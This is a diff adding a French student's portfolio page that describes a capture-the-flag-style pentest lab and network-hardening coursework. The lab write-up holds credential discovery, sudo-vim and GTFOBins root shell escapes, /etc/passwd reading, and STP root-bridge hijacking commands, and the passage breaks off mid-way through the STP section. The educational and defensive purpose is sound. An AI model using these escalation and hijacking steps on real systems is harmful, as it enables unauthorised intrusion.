@@ -1,0 +1,2333 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mes Compétences</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+<header>
+    <h1>Mes Compétences</h1>
+</header>
+
+<nav>
+    <a href="index.html">Accueil</a>
+    <a href="cv.html">Mon CV</a>
+    <a href="hobbies.html">Mes Hobbies</a>
+</nav>
+
+<div class="container">
+
+<!-- ============================================================ -->
+<!-- SURVEILLER                                                    -->
+<!-- ============================================================ -->
+<details class="accordion-item">
+    <summary class="accordion-title">Surveiller</summary>
+    <div class="accordion-content">
+
+        <!-- AC25.01Cyber -->
+        <details class="accordion-subitem">
+            <summary class="accordion-subtitle">
+                AC25.01Cyber | Administrer les protections contre les logiciels malveillants
+            </summary>
+            <div class="accordion-content">
+                <p>
+                    Dans le cadre de la <strong>SAÉ 3.Cyber.04 – Découvrir le pentesting</strong>,
+                    j'ai abordé l'administration des protections contre les logiciels malveillants
+                    sous l'angle offensif : comprendre précisément comment un attaquant ou un
+                    logiciel malveillant opère est la méthode la plus efficace pour définir,
+                    prioriser et mettre en place des protections adaptées.
+                </p>
+
+                <p><strong>1. Vérification de la connectivité et de la configuration réseau</strong></p>
+                <p>
+                    Avant toute chose, j'ai vérifié que ma machine Kali Linux était correctement
+                    configurée sur le réseau de test avec la commande <code>ip a</code>. Cette
+                    commande affiche les interfaces réseau disponibles, leurs adresses IP, masques
+                    de sous-réseau, et l'état de chaque interface (UP/DOWN). Ma machine Kali
+                    était configurée avec l'adresse <strong>10.15.250.129</strong>, dans le même
+                    segment réseau que la machine cible (10.16.20.187). Cette étape préliminaire
+                    est indispensable : un scan nmap sur une adresse injoignable retourne simplement
+                    que l'hôte est "down" sans distinguer si la machine est éteinte ou si le réseau
+                    est mal configuré.
+                </p>
+
+                <p><strong>2. Identification de la surface d'attaque avec nmap</strong></p>
+                <p>
+                    J'ai réalisé un scan complet de la machine cible
+                    (<strong>10.16.20.187</strong>) avec <strong>nmap</strong>. nmap (Network
+                    Mapper) est l'outil de référence pour la reconnaissance réseau : il envoie
+                    des paquets TCP, UDP ou ICMP et analyse les réponses pour déterminer quels
+                    ports sont ouverts, quels services y tournent, et quelles versions de ces
+                    services sont déployées. Un port ouvert qui répond avec un SYN-ACK à une
+                    sonde TCP SYN est un service actif qu'un logiciel malveillant peut exploiter.
+                    Ce scan m'a révélé deux points d'entrée potentiels : le port 80 (HTTP) ouvert
+                    et accessible, et le port 22 (SSH) dans un état "filtré" (un firewall ou
+                    iptables bloque activement ce port, mais le service SSH existe).
+                </p>
+                <p>
+                    Cette démarche reproduit exactement la phase de reconnaissance d'un logiciel
+                    malveillant ou d'un worm de type Morris : il scanne le réseau à la recherche
+                    de services vulnérables (versions obsolètes de SSH, serveurs HTTP sans
+                    authentification, services RPC exposés, etc.) pour identifier ses vecteurs
+                    d'infection.
+                </p>
+
+                <p><strong>3. Identification des vecteurs d'intrusion exploités</strong></p>
+                <p>
+                    La session complète m'a permis d'identifier quatre vecteurs d'intrusion
+                    distincts présents sur cette machine, chacun correspondant à un type de
+                    protection spécifique à administrer :
+                </p>
+                <p>
+                    <em>Vecteur 1 – Information Disclosure HTTP :</em> Des credentials (nom
+                    d'utilisateur et mot de passe encodé en Base64) étaient accessibles directement
+                    dans le code source d'une page web publique. Un logiciel malveillant
+                    ou un crawler automatisé peut récupérer ces informations en quelques millisecondes.
+                    Protection à administrer : interdire systématiquement l'inclusion de données
+                    sensibles dans les pages HTML, utiliser des variables d'environnement ou des
+                    gestionnaires de secrets (Vault, AWS Secrets Manager) pour les credentials.
+                </p>
+                <p>
+                    <em>Vecteur 2 – Encodage faible (Base64) :</em> Le mot de passe était
+                    protégé par un simple encodage Base64, trivialement réversible avec
+                    <code>echo "chaine" | base64 -d</code>. Protection à administrer : stocker
+                    les mots de passe avec un algorithme de hachage robuste adapté à cet usage
+                    (bcrypt avec un facteur de coût d'au moins 12, ou argon2id), jamais avec un
+                    encodage réversible ou un chiffrement symétrique dont la clé serait sur la
+                    même machine.
+                </p>
+                <p>
+                    <em>Vecteur 3 – Port SSH non protégé par authentification forte :</em>
+                    Malgré le port knocking, une fois la séquence connue, le service SSH
+                    acceptait une connexion par mot de passe simple. Protection à administrer :
+                    désactiver l'authentification par mot de passe SSH (<code>PasswordAuthentication no</code>
+                    dans <code>/etc/ssh/sshd_config</code>), n'autoriser que les clés publiques,
+                    et combiner avec fail2ban pour bloquer les tentatives de brute force.
+                </p>
+                <p>
+                    <em>Vecteur 4 – Droits sudo mal configurés (sudo sur vim) :</em> L'utilisateur
+                    disposait de droits sudo sans mot de passe sur <code>/usr/bin/vim</code>, un
+                    éditeur interactif permettant d'exécuter des commandes shell. Protection à
+                    administrer : n'accorder des droits sudo qu'aux commandes strictement nécessaires
+                    et sans fonctionnalité de shell intégré, en utilisant des règles
+                    <code>/etc/sudoers</code> granulaires avec l'utilitaire <code>visudo</code>.
+                    Consulter GTFOBins avant d'accorder des droits sudo sur n'importe quel binaire.
+                </p>
+
+                <p><strong>4. Contre-mesures concrètes à administrer</strong></p>
+                <p>
+                    En synthèse, cette expérience m'a permis de dresser une liste concrète de
+                    protections à déployer pour réduire la surface d'attaque d'un système Linux :
+                    désactiver tous services non nécessaires, ne jamais exposer de credentials
+                    dans le code source, utiliser bcrypt/argon2 pour les mots de passe, restreindre
+                    sudo aux binaires non interactifs, déployer fail2ban pour SSH, activer les
+                    journaux de connexion et mettre en place des alertes (SIEM) sur les connexions
+                    SSH réussies depuis des IPs inconnues.
+                </p>
+            </div>
+        </details>
+
+        <!-- AC25.02Cyber -->
+        <details class="accordion-subitem">
+            <summary class="accordion-subtitle">
+                AC25.02Cyber | Prendre en main des outils de test de pénétration réseau/système
+            </summary>
+            <div class="accordion-content">
+                <p>
+                    Dans le cadre de la <strong>SAÉ 3.Cyber.04 – Découvrir le pentesting</strong>,
+                    j'ai conduit une session de test d'intrusion complète et méthodique sur une
+                    machine cible (<strong>10.16.20.187</strong>) depuis Kali Linux, en enchaînant
+                    six étapes couvrant l'intégralité de la kill chain offensive.
+                </p>
+
+                <p><strong>Étape 1 – Reconnaissance réseau avec nmap</strong></p>
+                <p>
+                    J'ai exécuté <code>nmap 10.16.20.187 -all</code> pour effectuer un scan
+                    complet de la machine cible. nmap détermine l'état de chaque port en analysant
+                    les réponses au niveau TCP/IP :
+                </p>
+                <ul>
+                    <li>Un port <strong>ouvert</strong> répond avec TCP SYN-ACK à une sonde TCP SYN.</li>
+                    <li>Un port <strong>fermé</strong> répond avec TCP RST (le service n'écoute pas).</li>
+                    <li>Un port <strong>filtré</strong> ne répond pas ou renvoie ICMP unreachable
+                        (un firewall bloque activement la sonde, mais quelque chose existe derrière).</li>
+                </ul>
+                <p>
+                    Résultat : port <strong>80/tcp (HTTP) ouvert</strong>, port <strong>22/tcp
+                    (SSH) filtré</strong>. Le port 22 filtré indique la présence d'un mécanisme
+                    de protection dynamique – il s'agit ici de port knocking implémenté via
+                    des règles iptables avec le module <code>recent</code>.
+                </p>
+
+                <p><strong>Étape 2 – Extraction d'informations sensibles avec curl</strong></p>
+                <p>
+                    J'ai utilisé <code>curl http://10.16.20.187</code> pour récupérer le contenu
+                    HTML complet de la page web hébergée sur la cible. <strong>curl</strong>
+                    (Client URL) est un outil en ligne de commande permettant de transférer des
+                    données via de nombreux protocoles (HTTP, HTTPS, FTP, SFTP…). Il retourne
+                    directement le corps de la réponse HTTP dans le terminal, sans interprétation
+                    HTML. En scrollant dans la réponse jusqu'au bas de la page, j'ai repéré
+                    deux variables contenant ce qui ressemblait à un nom d'utilisateur et un
+                    mot de passe encodé. La présence du caractère <code>=</code> ou <code>==</code>
+                    en fin de chaîne est la signature caractéristique du padding Base64 : Base64
+                    encode 3 octets en 4 caractères ASCII, et complète avec des <code>=</code>
+                    si la longueur des données source n'est pas un multiple de 3. J'ai décodé
+                    la chaîne dans le terminal avec plusieurs passes successives :
+                </p>
+                <pre><code>echo "chaine_encodee_base64" | base64 -d
+# Si le résultat est encore en Base64 :
+echo "resultat_intermediaire" | base64 -d
+# Répéter jusqu'à obtenir du texte clair</code></pre>
+                <p>
+                    Le résultat final était le mot de passe en clair : <strong>zulululu123</strong>.
+                    Cette étape illustre une vulnérabilité OWASP A02:2021 – Cryptographic Failures :
+                    l'utilisation d'un encodage réversible au lieu d'un vrai mécanisme cryptographique
+                    pour protéger des données sensibles.
+                </p>
+
+                <p><strong>Étape 3 – Résolution du problème de synchronisation SSH (Port Knocking)</strong></p>
+                <p>
+                    Le port knocking est un mécanisme de sécurité par obscurité : le service SSH
+                    reste invisible (port filtré) jusqu'à ce qu'une séquence précise de tentatives
+                    de connexion TCP sur des ports spécifiques soit détectée par le pare-feu. Une
+                    fois la séquence envoyée, le firewall ajoute dynamiquement une règle iptables
+                    ouvrant le port 22 pour l'IP source, mais seulement pour une courte durée
+                    (typiquement 10-30 secondes). La difficulté : le temps d'exécuter la commande
+                    SSH après le port knocking, le port se refermait. La solution technique que
+                    j'ai mise en place utilise deux terminaux en parallèle :
+                </p>
+                <pre><code># Terminal 1 (en attente active) :
+ssh <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="b2d983c6c681dcc1f283829c83849c80829c838a85">[email&#160;protected]</a>
+# Le client SSH essaie de se connecter en boucle
+
+# Terminal 2 (déclenchement du port knocking) :
+nmap 10.16.20.187 -r
+# L'option -r scanne les ports dans l'ordre, ce qui déclenche la séquence</code></pre>
+                <p>
+                    Au moment précis où nmap a envoyé les paquets de la séquence de port knocking,
+                    le pare-feu a ouvert le port 22 pour mon IP. La connexion SSH du terminal 1,
+                    qui attendait déjà, a établi la poignée de main TCP en quelques millisecondes
+                    avant que le port ne se referme.
+                </p>
+
+                <p><strong>Étape 4 – Authentification SSH et exploration du système</strong></p>
+                <p>
+                    La connexion SSH s'est établie avec le compte <strong>k1tt3ns</strong> et le
+                    mot de passe <strong>zulululu123</strong> découvert à l'étape 2. Une fois connecté,
+                    j'ai exploré le système avec les commandes de base : <code>whoami</code> (confirmer
+                    l'identité), <code>id</code> (groupes et UID/GID), <code>pwd</code> (répertoire
+                    courant), <code>ls -la</code> (lister les fichiers avec droits et métadonnées),
+                    <code>cat /etc/passwd</code> (liste des comptes utilisateurs système) et
+                    <code>uname -a</code> (version du noyau Linux, utile pour identifier des
+                    CVEs d'escalade de privilèges kernel).
+                </p>
+
+                <p><strong>Étape 5 – Escalade de privilèges verticale via vim</strong></p>
+                <p>
+                    J'ai exécuté <code>sudo -l</code> pour lister toutes les commandes qu'un
+                    utilisateur peut exécuter avec sudo, avec ou sans mot de passe. La sortie
+                    indiquait que l'utilisateur <em>k1tt3ns</em> pouvait exécuter
+                    <code>/usr/bin/vim</code> <strong>sans fournir de mot de passe</strong>
+                    (entry <code>NOPASSWD: /usr/bin/vim</code>). vim est un éditeur de texte
+                    interactif qui dispose d'une fonctionnalité permettant d'exécuter des
+                    commandes shell depuis son interface. En lançant vim avec sudo puis en
+                    utilisant la commande interne <code>:!bin/sh</code>, on obtient un shell
+                    hérité du processus vim, qui tourne avec les droits root :
+                </p>
+                <pre><code>sudo /usr/bin/vim
+# Dans vim, taper en mode commande :
+:!bin/sh
+# Résultat : shell root ouvert dans le terminal
+whoami
+# root</code></pre>
+                <p>
+                    Cette technique est répertoriée dans <strong>GTFOBins</strong>, une base de
+                    données open source listant les binaires Unix pouvant être utilisés pour
+                    contourner les restrictions de sécurité locales. Elle s'applique à de nombreux
+                    outils interactifs : less (<code>!sh</code>), more (<code>!sh</code>), nano
+                    (<code>^R^X</code>), awk (<code>BEGIN {system("/bin/sh")}</code>), etc.
+                </p>
+
+                <p><strong>Étape 6 – Récupération du flag</strong></p>
+                <p>
+                    Depuis le shell root, je me suis déplacé dans le répertoire home de l'utilisateur
+                    avec <code>cd /home/k1tt3ns</code> et j'ai listé les fichiers avec <code>ls -la</code>.
+                    J'ai découvert le fichier <code>flag.sh</code>. En l'exécutant avec
+                    <code>./flag.sh</code>, le script m'a demandé d'entrer l'adresse IP de ma
+                    machine (<strong>10.15.250.129</strong>) et a affiché le flag validant la
+                    réussite complète de la session de pentesting.
+                </p>
+            </div>
+        </details>
+
+    </div>
+</details>
+
+<!-- ============================================================ -->
+<!-- SECURISER                                                     -->
+<!-- ============================================================ -->
+<details class="accordion-item">
+    <summary class="accordion-title">Sécuriser</summary>
+    <div class="accordion-content">
+
+        <!-- AC24.01Cyber -->
+        <details class="accordion-subitem">
+            <summary class="accordion-subtitle">
+                AC24.01Cyber | Connaître et utiliser les bonnes pratiques et les recommandations de cybersécurité
+            </summary>
+            <div class="accordion-content">
+                <p>
+                    Dans le cadre de la <strong>SAÉ 4.Cyber.01 – Sécuriser un système d'information</strong>,
+                    j'ai réalisé une analyse complète du guide ANSSI <em>Recommandations pour la
+                    protection des systèmes d'information essentiels</em> (v1.0), qui définit
+                    62 recommandations organisées en 8 thèmes. Chaque mesure a été confrontée à
+                    nos configurations réelles dans Packet Tracer et classée selon trois statuts :
+                    <strong>Retenue</strong> (mesure appliquée totalement ou partiellement),
+                    <strong>Exclue</strong> (pertinente mais techniquement impossible dans Packet
+                    Tracer, comme le MFA) et <strong>Non applicable</strong> (hors périmètre,
+                    comme les supports amovibles ou l'externalisation).
+                </p>
+
+                <p><strong>1. Bilan de conformité : 85 % des mesures retenues</strong></p>
+                <p>
+                    Sur 62 recommandations, <strong>53 ont été retenues (85 %)</strong>, dont
+                    35 totalement mises en œuvre et 18 partiellement. 5 mesures ont été exclues
+                    (R17+, R19, R33, R39, R50), uniquement en raison des contraintes de Packet
+                    Tracer. 21 mesures sont non applicables à ce type de projet. Ce taux de
+                    85 % s'explique par la richesse de l'infrastructure déployée : double couche
+                    de filtrage (ACL switch L3 + ASA), tunnel GRE/IPSec chiffré, DMZ, HTTPS/TLS,
+                    DNSSEC, SSH avec Telnet désactivé, politique deny-all sur toutes les ACLs.
+                </p>
+
+                <p><strong>2. Points forts de l'implémentation</strong></p>
+                <p>
+                    <em>Segmentation et cloisonnement (R9, R10, R11) :</em> le réseau est
+                    découpé en 3 VLANs par site (Admin VLAN10/11, Service VLAN20/21, Production
+                    VLAN30/31) plus une DMZ isolée (192.168.40.0/24 et 192.168.41.0/24). Chaque
+                    VLAN n'accède qu'aux ressources nécessaires à son activité. L'admin a un
+                    accès total, Service et Production sont totalement isolés.
+                </p>
+                <p>
+                    <em>Chiffrement inter-sites (R11-, R18, R22) :</em> tunnel GRE over IPSec
+                    avec AES-256, SHA-256, IKEv1/ISAKMP et Diffie-Hellman Group 5. Les flux
+                    inter-sites sont chiffrés de bout en bout sur le réseau opérateur.
+                </p>
+                <p>
+                    <em>Sécurisation web et DNS (R16) :</em> HTTPS/TLS avec certificat
+                    auto-signé RSA 4096 bits, redirection permanente HTTP → HTTPS, en-têtes
+                    HSTS (<code>max-age=31536000</code>), X-Frame-Options, X-XSS-Protection,
+                    X-Content-Type-Options, Referrer-Policy. DNSSEC avec ZSK RSA 2048 bits
+                    et KSK RSA 4096 bits, enregistrements RRSIG vérifiés.
+                </p>
+                <p>
+                    <em>Filtrage exhaustif (R23, R24, R25, R27, R28) :</em> politique deny-all
+                    sur toutes les ACLs (switch L3 et ASA), matrice de flux documentée en
+                    section 10 du Write Up, règles commentées et justifiées, hitcounts
+                    vérifiables avec <code>show access-list</code>.
+                </p>
+
+                <p><strong>3. Mesures exclues et plans d'action production</strong></p>
+                <p>
+                    Les 5 mesures exclues disposent toutes d'un plan d'action documenté pour
+                    un déploiement en production réelle. R17+ et R19 (MFA accès public et
+                    nomade) : déployer TOTP (Google Authenticator / FreeOTP) ou certificat
+                    client TLS ; R33 (MFA admin) : Cisco ISE ou FreeRADIUS + OTP pour
+                    l'authentification SSH ; R39 (réseau physique d'administration dédié) :
+                    câblage physique séparé remplaçant le VLAN Admin logique ; R50 (coffre-fort
+                    de mots de passe) : KeePassXC (usage individuel) ou HashiCorp Vault (usage
+                    centralisé).
+                </p>
+            </div>
+        </details>
+
+        <!-- AC24.02Cyber -->
+        <details class="accordion-subitem">
+            <summary class="accordion-subtitle">
+                AC24.02Cyber | Mettre en œuvre les outils fondamentaux de sécurisation d'une infrastructure du réseau
+            </summary>
+            <div class="accordion-content">
+                <p>
+                    Dans le cadre de la <strong>SAÉ 4.Cyber.01 – Sécuriser un système d'information</strong>,
+                    j'ai déployé et configuré une double couche de sécurisation sur les deux sites
+                    de l'entreprise : des ACLs stateful sur les switchs L3 et des pare-feux
+                    Cisco ASA 5506-X avec politique d'inspection.
+                </p>
+
+                <p><strong>1. ACL BLOCK_SERVICE_PROD sur switch L3 — whitelist stateful</strong></p>
+                <p>
+                    La première couche de filtrage est une ACL étendue nommée
+                    <code>BLOCK_SERVICE_PROD</code>, appliquée en direction <em>in</em> sur les
+                    interfaces VLAN20 (Service) et VLAN30 (Production) des switchs SR1 et SR2.
+                    Elle adopte une approche whitelist stricte : seules les initiations de l'Admin
+                    et les réponses vers l'Admin sont autorisées, tout le reste est bloqué.
+                </p>
+                <pre><code>ip access-list extended BLOCK_SERVICE_PROD
+ permit ospf any any                              ! OSPF non bloqué
+ permit ip   192.168.10.0 0.0.0.255 any          ! Admin gauche : accès total
+ permit ip   192.168.11.0 0.0.0.255 any          ! Admin droit  : accès total
+ permit tcp  any 192.168.10.0 0.0.0.255 established ! Réponses TCP vers Admin gauche
+ permit tcp  any 192.168.11.0 0.0.0.255 established ! Réponses TCP vers Admin droit
+ permit icmp any 192.168.10.0 0.0.0.255 echo-reply  ! Réponses ping vers Admin gauche
+ permit icmp any 192.168.11.0 0.0.0.255 echo-reply  ! Réponses ping vers Admin droit
+ deny   ip   any any                              ! Tout le reste bloqué</code></pre>
+                <p>
+                    Le mot-clé <code>established</code> filtre les paquets TCP dont le bit ACK
+                    ou RST est positionné, caractéristique des paquets appartenant à une connexion
+                    déjà établie. Cela autorise les réponses à des connexions initiées par Admin
+                    sans autoriser Service à initier lui-même de nouvelles connexions TCP.
+                    <code>echo-reply</code> fait de même pour ICMP.
+                </p>
+
+                <p><strong>2. Cisco ASA 5506-X — architecture trois zones</strong></p>
+                <p>
+                    La seconde couche est un pare-feu Cisco ASA 5506-X par site, avec trois
+                    interfaces dédiées à trois zones de sécurité distinctes :
+                </p>
+                <pre><code>interface GigabitEthernet1/1
+ nameif outside        ! Zone WAN (vers routeur R1/R3)
+ security-level 100
+ ip address 172.16.1.1 255.255.255.0
+
+interface GigabitEthernet1/2
+ nameif inside         ! Zone LAN (vers switch L3)
+ security-level 100
+ ip address 172.16.0.2 255.255.255.0
+
+interface GigabitEthernet1/3
+ nameif DMZ            ! Zone DMZ (vers serveurs publics)
+ security-level 100
+ ip address 192.168.40.1 255.255.255.0</code></pre>
+                <p>
+                    Trois ACLs nommées contrôlent chaque direction :
+                    <code>INSIDE_IN</code> (filtre le trafic LAN → ASA),
+                    <code>OUTSIDE_IN</code> (filtre le trafic WAN/tunnel → ASA),
+                    <code>DMZ_IN</code> (filtre le trafic DMZ → ASA). La règle fondamentale :
+                    <code>permit ip 192.168.10.0 255.255.255.0 any</code> donne un accès total
+                    à l'Admin, et <code>deny ip any any</code> en fin d'ACL bloque tout
+                    flux non explicitement autorisé.
+                </p>
+
+                <p><strong>3. inspect icmp — filtrage stateful ICMP</strong></p>
+                <p>
+                    La commande <code>inspect icmp</code> dans la <code>service-policy
+                    global_policy</code> active le suivi d'état des sessions ICMP sur l'ASA.
+                    Quand un Admin envoie un ping, l'ASA crée une entrée dans sa table de sessions.
+                    La réponse echo-reply est automatiquement autorisée car elle correspond à
+                    la session. Si Service tente d'initier un ping, l'ASA ne trouve aucune session
+                    correspondante et le bloque, même sans règle ACL explicite.
+                </p>
+                <pre><code>class-map inspection_default
+ match default-inspection-traffic
+policy-map global_policy
+ class inspection_default
+  inspect dns preset_dns_map
+  inspect ftp
+  inspect icmp
+  inspect tftp
+service-policy global_policy global</code></pre>
+            </div>
+        </details>
+
+        <!-- AC24.03Cyber -->
+        <details class="accordion-subitem">
+            <summary class="accordion-subtitle">
+                AC24.03Cyber | Sécuriser les services
+            </summary>
+            <div class="accordion-content">
+                <p>
+                    Dans le cadre de la <strong>SAÉ 4.Cyber.01 – Sécuriser un système d'information</strong>,
+                    j'ai sécurisé les services exposés en DMZ sur chacun des deux sites, en prenant
+                    en charge ma spécialisation individuelle : la migration HTTP vers HTTPS sur
+                    serveur Apache2 sous VM Linux Ubuntu.
+                </p>
+
+                <p><strong>1. Architecture DMZ — isolation des services publics</strong></p>
+                <p>
+                    Chaque site dispose d'un serveur DMZ (DMZ SERVER 1 : 192.168.40.2 / DMZ SERVER 2 :
+                    192.168.41.2) hébergeant trois services : HTTP (port 80), HTTPS (port 443)
+                    et DNS (port 53). Ces serveurs sont connectés sur l'interface
+                    <code>Gig1/3</code> du pare-feu ASA (zone DMZ, 192.168.40.1 et 192.168.41.1),
+                    physiquement distincte du LAN interne (inside) et du WAN (outside). Si un
+                    serveur DMZ est compromis, l'attaquant se retrouve dans la DMZ, isolé du
+                    LAN interne par le pare-feu. L'ACL <code>DMZ_IN</code> contrôle ce que le
+                    serveur DMZ peut initier : il ne peut communiquer qu'avec les VLANs Admin
+                    des deux sites, jamais avec Service ou Production.
+                </p>
+
+                <p><strong>2. Sécurisation HTTPS avec Apache2 et OpenSSL (ma spécialisation)</strong></p>
+                <p>
+                    Sur VM Linux Ubuntu (IP : 192.31.25.16), j'ai sécurisé le serveur web Apache2
+                    en forçant TLS/SSL et en ajoutant les en-têtes de sécurité HTTP recommandés.
+                </p>
+                <pre><code># Installation et activation du module SSL
+sudo apt install openssl
+sudo a2enmod ssl
+
+# Génération du certificat auto-signé RSA 4096 bits
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem \
+    -days 365 -nodes \
+    -subj "/C=FR/ST=Haut de france/L=Bethune/OU=R&T/CN=192.31.25.16"
+
+# Copie dans le répertoire Apache
+sudo cp cert.pem /etc/apache2/ssl/cert.pem
+sudo cp key.pem  /etc/apache2/ssl/key.pem</code></pre>
+                <p>
+                    Configuration dans <code>/etc/apache2/sites-available/default-ssl.conf</code> :
+                </p>
+                <pre><code>ServerName 192.31.25.16
+SSLEngine on
+SSLCertificateFile    /etc/apache2/ssl/cert.pem
+SSLCertificateKeyFile /etc/apache2/ssl/key.pem
+
+# En-têtes de sécurité HTTP
+Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
+Header set X-Content-Type-Options nosniff
+Header set X-XSS-Protection "1; mode=block"
+Header set X-Frame-Options SAMEORIGIN
+Header set Referrer-Policy "strict-origin-when-cross-origin"
+
+# Redirection permanente HTTP -> HTTPS
+Redirect permanent / https://192.31.25.16/</code></pre>
+                <p>
+                    <code>Strict-Transport-Security</code> (HSTS) force le navigateur à n'utiliser
+                    que HTTPS pendant un an, rendant impossible une attaque SSL Stripping.
+                    <code>X-Content-Type-Options nosniff</code> empêche le MIME sniffing (un fichier
+                    texte ne peut pas être exécuté comme script). <code>X-Frame-Options SAMEORIGIN</code>
+                    bloque le Clickjacking (chargement de la page dans une iframe d'un site tiers).
+                    <code>X-XSS-Protection</code> active le filtre XSS intégré aux navigateurs.
+                </p>
+
+                <p><strong>3. Sécurisation DNS avec DNSSEC (spécialisation de Matisse Rudiger)</strong></p>
+                <p>
+                    DNSSEC (Domain Name System Security Extensions) assure l'intégrité et
+                    l'authenticité des enregistrements DNS via des signatures cryptographiques,
+                    empêchant les attaques de type cache poisoning. Deux clés sont générées :
+                    une ZSK (Zone Signing Key, RSA 2048 bits) qui signe les enregistrements de
+                    la zone, et une KSK (Key Signing Key, RSA 4096 bits) qui signe la ZSK,
+                    formant une chaîne de confiance.
+                </p>
+                <pre><code># Génération ZSK (RSA 2048 bits)
+sudo dnssec-keygen -a RSASHA256 -b 2048 -n ZONE example.local
+# Génération KSK (RSA 4096 bits)
+sudo dnssec-keygen -f KSK -a RSASHA256 -b 4096 -n ZONE example.local
+
+# Inclusion dans le fichier de zone et signature
+sudo dnssec-signzone -o example.local /etc/bind/db.example.local
+
+# Vérification — présence du flag 'ad' et des enregistrements RRSIG
+dig @192.31.25.18 www.example.local +dnssec
+# --> Réponse avec RRSIG + flag ad = validation DNSSEC réussie</code></pre>
+            </div>
+        </details>
+
+        <!-- AC24.04Cyber -->
+        <details class="accordion-subitem">
+            <summary class="accordion-subtitle">
+                AC24.04Cyber | Choisir les outils cryptographiques adaptés au besoin fonctionnel du système d'information
+            </summary>
+            <div class="accordion-content">
+                <p>
+                    Dans le cadre de la <strong>SAÉ 4.Cyber.01 – Sécuriser un système d'information</strong>,
+                    j'ai appliqué trois niveaux cryptographiques distincts, chacun adapté à un
+                    besoin fonctionnel précis : chiffrement des flux réseau inter-sites, sécurisation
+                    des services web en DMZ, et intégrité des enregistrements DNS.
+                </p>
+
+                <p><strong>1. Les trois grandes catégories cryptographiques</strong></p>
+                <p>
+                    <strong>L'encodage</strong> (Base64, hexadécimal) transforme des données sans
+                    clé secrète. Il sert à la compatibilité de transport, jamais à la confidentialité.
+                    N'importe qui peut décoder un Base64 instantanément avec <code>base64 -d</code>.
+                </p>
+                <p>
+                    <strong>Le hachage cryptographique</strong> (SHA-256, bcrypt, argon2id) est une
+                    fonction à sens unique irréversible. SHA-256 sert à la vérification d'intégrité
+                    (HMAC dans IPSec) ; bcrypt et argon2id servent au stockage de mots de passe
+                    car leur facteur de travail réglable rend le brute force impraticable.
+                </p>
+                <p>
+                    <strong>Le chiffrement symétrique</strong> (AES-256) utilise une clé secrète
+                    partagée. C'est le plus performant pour de gros volumes de données : IPSec
+                    l'utilise pour chiffrer les flux réseau après échange de clés asymétrique.
+                    <strong>Le chiffrement asymétrique</strong> (RSA-4096, ECDSA) utilise une
+                    paire clé publique / clé privée : utilisé pour TLS/HTTPS, DNSSEC et l'échange
+                    de clés de session IPSec (Diffie-Hellman).
+                </p>
+
+                <p><strong>2. Tunnel GRE over IPSec — AES-256, SHA-256, IKEv1, DH Group 5</strong></p>
+                <p>
+                    Le tunnel inter-sites entre R1 et R3 utilise IPSec pour chiffrer et
+                    authentifier tous les flux transitant sur le réseau opérateur. La combinaison
+                    des algorithmes garantit trois propriétés fondamentales :
+                    <strong>confidentialité</strong> (AES-256 en mode CBC chiffre les données,
+                    rendant le trafic illisible sur le réseau de transit R2),
+                    <strong>intégrité</strong> (HMAC-SHA-256 détecte toute altération des paquets)
+                    et <strong>authenticité</strong> (IKEv1/ISAKMP avec PSK et DH Group 5 assure
+                    que les deux extrémités sont bien R1 et R3). Le choix d'AES-256 plutôt
+                    qu'AES-128 est justifié par le contexte de sécurisation d'un SI essentiel
+                    (recommandation ANSSI R11-).
+                </p>
+
+                <p><strong>3. HTTPS avec certificat RSA 4096 bits — services DMZ</strong></p>
+                <p>
+                    Pour les serveurs web en DMZ (ma spécialisation), j'ai choisi RSA 4096 bits
+                    plutôt que RSA 2048 bits car c'est la recommandation ANSSI pour les nouveaux
+                    certificats. La longueur de clé plus grande augmente la résistance aux
+                    attaques par factorisation. L'en-tête HSTS (<code>Strict-Transport-Security:
+                    max-age=31536000</code>) empêche toute dégradation vers HTTP non chiffré
+                    (attaque SSL Stripping), complémentant la redirection Apache. TLS assure
+                    ici le chiffrement asymétrique pour l'échange de clés (handshake), puis
+                    symétrique (AES) pour le flux de données.
+                </p>
+
+                <p><strong>4. DNSSEC — signatures RSA pour l'intégrité DNS</strong></p>
+                <p>
+                    DNSSEC utilise le chiffrement asymétrique différemment : non pas pour la
+                    confidentialité, mais pour l'<strong>authenticité et l'intégrité</strong>
+                    des enregistrements DNS. La ZSK (RSA 2048 bits) signe les enregistrements
+                    de la zone avec sa clé privée ; les résolveurs vérifient avec la clé publique
+                    (DNSKEY). La KSK (RSA 4096 bits) signe la ZSK, formant une chaîne de
+                    confiance. Ce mécanisme prévient le DNS cache poisoning : un attaquant ne
+                    peut pas injecter de faux enregistrements car il ne possède pas la clé
+                    privée ZSK pour générer une signature RRSIG valide.
+                </p>
+            </div>
+        </details>
+
+        <!-- AC24.05Cyber -->
+        <details class="accordion-subitem">
+            <summary class="accordion-subtitle">
+                AC24.05Cyber | Connaître les différents types d'attaque
+            </summary>
+            <div class="accordion-content">
+                <p>
+                    Dans le cadre de la <strong>SAÉ 4.Cyber.01 – Sécuriser un système d'information</strong>,
+                    j'ai étudié et mis en pratique plusieurs types d'attaques réseau dans le cadre
+                    des tests de sécurité réalisés par Antoine Grevin, en participant à leur
+                    compréhension et à la définition des contre-mesures.
+                </p>
+
+                <p><strong>1. Attaque STP — Root Bridge Hijacking (Man-in-the-Middle L2)</strong></p>
+                <p>
+                    Le Spanning Tree Protocol (STP, IEEE 802.1D) évite les boucles réseau en
+                    élisant un <strong>Root Bridge</strong> parmi tous les switchs : celui avec
+                    la priorité la plus basse est élu. SR2 était Root Bridge légitime avec
+                    priorité 32778. L'attaque consiste à connecter un switch malveillant (SW-A)
+                    sur un port trunk de SR2, puis à configurer sa priorité STP à
+                    <strong>0</strong> (valeur minimale) sur tous les VLANs :
+                </p>
+                <pre><code>! Sur SW-A — switch attaquant
+SW-A(config)# spanning-tree vlan 1  priority 0
+SW-A(config)# spanning-tree vlan 10 priority 0
+SW-A(config)# spanning-tree vlan 20 priority 0
+SW-A(config)# spanning-tree vlan 30 priority 0
+
+! Vérification — SW-A élu Root Bridge
+SW-A# show spanning-tree vlan 10
+Root ID  Priority 10        ← SW-A est Root Bridge
+         This bridge is the root
+
+! Sur SR2 — Root Bridge légitime déclassé
+SR2# show spanning-tree vlan 10
+Root ID  Priority 10
+         Port 6(GigabitEthernet1/0/6)  ← Root via SW-A !</code></pre>
